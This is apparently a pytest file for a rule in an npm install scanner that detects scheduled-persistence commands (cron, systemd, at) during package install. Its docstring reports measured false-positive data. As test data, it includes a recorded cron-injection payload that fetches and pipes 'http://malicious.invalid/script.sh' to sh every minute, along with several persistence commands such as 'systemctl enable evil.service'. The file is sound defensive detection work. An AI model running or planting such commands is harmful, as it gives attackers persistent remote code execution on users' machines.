"""`EXEC_SCHEDULED_PERSISTENCE` - install-time cron / systemd / `at` registration.

**Why this rule exists, and why it is the only one of five candidates that shipped.** The gap
was found by re-scoring the recorded telemetry with the rules alone (`eval/score_rules.py`) and
listing the attack cases the rules do not Block. `gm05-cron-inject` was one of them, and unlike
most of the others its evidence was already in the kernel record - the whole command line is
there - so no new telemetry was needed to catch it.

Five candidate signals were then measured against every recorded install available: 3342 exec
events across 742 installs (the 142 eval cases plus the 100- and 500-package registry sweeps,
604 of them uncurated packages straight off the npm feed). Results, all four negatives kept on
the record in `brain/rules.py` next to the pattern:

    cron / systemd / at     1 attack, 0 of 104 benign, 0 of 604 uncurated   -> shipped
    chmod +x                0 attacks, 2 uncurated false positives          -> rejected
    curl|sh, wget|sh        3 attacks, 0 false positives, all already Block -> no new catch
    ~/.bashrc, nohup, …     no matches at all, including in the four cases
                            that do exactly that (they use node's fs API)   -> needs telemetry

Verdict impact, measured not argued: exactly one case moves, `gm05-cron-inject` Clean ->
Blocked at the rules level. Its `full` verdict was already Blocked, so no published figure
changes.
"""

import pytest

from brain.rules import SCHEDULE_PERSIST_RE, Severity, evaluate
from shared.contract import DetonateResult, ExecEvent
from tests.conftest import NPM_EXEC


def exec_(args: str, binary: str = "/usr/bin/sh") -> ExecEvent:
    return ExecEvent(ts="2026-01-01T00:00:01Z", pid=42, ppid=1, binary=binary, args=args,
                     parent_binary="/usr/local/bin/node", uid=10001, cwd="/work")  # fmt: skip


def result(*execs: ExecEvent) -> DetonateResult:
    return DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                          exec_events=[NPM_EXEC, *execs], connect_events=[], dns_queries=[],
                          stdout_tail="", stderr_tail="")  # fmt: skip


def rule_ids(res: DetonateResult) -> list[str]:
    return [h.rule_id for h in evaluate(res)]


# --- the real recorded case this rule was written for ---


def test_the_gm05_command_line_exactly_as_the_kernel_recorded_it():
    """Copied from the telemetry, not paraphrased: the payload never execs `curl`, so
    EXEC_NET_TOOL cannot fire - the curl lives inside a string being echoed into crontab."""
    recorded = (
        '-c "(crontab -l 2>/dev/null; echo "* * * * * curl -s '
        'http://malicious.invalid/script.sh | sh") | crontab - || true"'
    )
    hits = evaluate(result(exec_(recorded)))
    scheduled = [h for h in hits if h.rule_id == "EXEC_SCHEDULED_PERSISTENCE"]
    assert len(scheduled) == 1
    assert scheduled[0].severity == Severity.HIGH, "HIGH is what makes it Block"
    assert "EXEC_NET_TOOL" not in rule_ids(result(exec_(recorded))), (
        "if this ever fires, the rule is no longer load-bearing for gm05 and the test is lying"
    )


@pytest.mark.parametrize(
    "args",
    [
        '-c "crontab -l | crontab -"',
        "-c \"echo '* * * * * /tmp/x' | crontab -\"",
        '-c "cp unit.service /etc/cron.d/task"',
        '-c "echo job >> /var/spool/cron/crontabs/root"',
        '-c "systemctl enable evil.service"',
        '-c "systemctl --user start evil.timer"',
        '-c "systemd-run --on-active=60 /tmp/x"',
        '-c "at now + 1 minute"',
        '-c "at -f /tmp/job now"',
    ],
)
def test_scheduling_primitives_are_flagged(args):
    assert "EXEC_SCHEDULED_PERSISTENCE" in rule_ids(result(exec_(args)))


def test_the_crontab_binary_itself_is_flagged_not_only_shell_strings():
    assert "EXEC_SCHEDULED_PERSISTENCE" in rule_ids(result(exec_("-l", "/usr/bin/crontab")))


def test_a_match_past_the_evidence_cap_is_still_found():
    """The evidence string shown to a reviewer is clipped to 160 characters. Matching on the
    clipped copy would let a long command hide the call; the rule matches the full argv."""
    long_prefix = "echo " + "a" * 400
    args = f'-c "{long_prefix}; crontab -l | crontab -"'
    assert "EXEC_SCHEDULED_PERSISTENCE" in rule_ids(result(exec_(args)))


# --- what it must not flag ---


@pytest.mark.parametrize(
    "args",
    [
        # The word appears, but not as a scheduling call. These are the shapes a benign
        # package plausibly has: documentation, filenames, package names, npm scripts.
        '-c "node build.js --out docs/crontab-format.md"',
        '-c "cp README.cron.md /work/docs/"',
        '-c "npm run at-build"',
        '-c "node -e \'console.log(\\"scheduled at build time\\")\'"',
        '-c "tar xzf node-cron-3.0.0.tgz"',
        '-c "systemctl status something"',  # reading state is not registering a job
        '-c "chmod +x ./vendor/tool"',  # measured: 2 real uncurated packages do this
        # These need the command-position anchor specifically: `crontab` here is the tail of a
        # path and *is* followed by whitespace, so the `(?=\\s|$)` lookahead alone lets them
        # through. A mutation that deleted the anchor survived until these were added.
        '-c "ls /work/vendor/crontab /tmp"',
        '-c "node ./scripts/crontab build"',
        '-c "cat docs/systemd-run notes.txt"',
    ],
)
def test_benign_shapes_are_not_flagged(args):
    assert "EXEC_SCHEDULED_PERSISTENCE" not in rule_ids(result(exec_(args)))


def test_the_pattern_does_not_match_the_npm_baseline_command():
    """Every single recorded install execs this. A match here would block all 742."""
    assert not SCHEDULE_PERSIST_RE.search(f"{NPM_EXEC.binary} {NPM_EXEC.args}")


def test_chmod_executable_was_deliberately_not_turned_into_a_rule():
    """Recorded negative result. `chmod +x` had 2 false positives among 604 uncurated
    packages (a real package marking a vendored binary executable), so it is not a rule.
    Pinned so nobody adds it later without re-measuring."""
    real_uncurated = "/usr/bin/chmod +x /work/node_modules/@scope/pkg/.tool-bin/tmp.AAA/uv"
    assert rule_ids(result(exec_(real_uncurated, "/usr/bin/chmod"))) == []


def test_reading_a_crontab_without_writing_one_is_still_flagged_and_that_is_accepted():
    """An honest limit, stated rather than hidden: the rule does not distinguish `crontab -l`
    from `crontab -`. Listing jobs is harmless, but no npm install has cause to do either, and
    the measured false-positive rate across 604 uncurated packages was zero. If that ever
    changes, narrowing to writes is the fix."""
    assert "EXEC_SCHEDULED_PERSISTENCE" in rule_ids(result(exec_('-c "crontab -l"')))


# --- it blocks, and it does not disturb anything else ---


def test_the_rule_blocks_rather_than_asking_for_review():
    from brain.llm import LlmOutcome
    from brain.verdict import combine

    res = result(exec_('-c "crontab -l | crontab -"'))
    final = combine(evaluate(res), LlmOutcome("m", error="x", skipped=True), res)
    assert final.title == "Blocked" and final.conclusion == "failure"


def test_a_clean_install_is_unaffected():
    assert rule_ids(result()) == []
